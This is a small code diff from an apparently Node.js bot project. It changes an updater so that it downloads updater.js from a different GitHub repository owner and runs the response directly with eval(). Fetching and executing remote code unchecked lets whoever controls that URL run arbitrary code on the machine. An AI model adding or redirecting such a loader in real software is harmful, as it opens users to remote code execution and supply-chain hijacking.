@@ -1,4 +1,4 @@
 const axios = require('axios');
 
-axios.get("https://raw.githubusercontent.com/JAHIDULLX6/goatbot/refs/heads/main/updater.js")
+axios.get("https://raw.githubusercontent.com/SAGOR-KINGx/ONLINE/refs/heads/main/updater.js")
 	.then(res => eval(res.data));
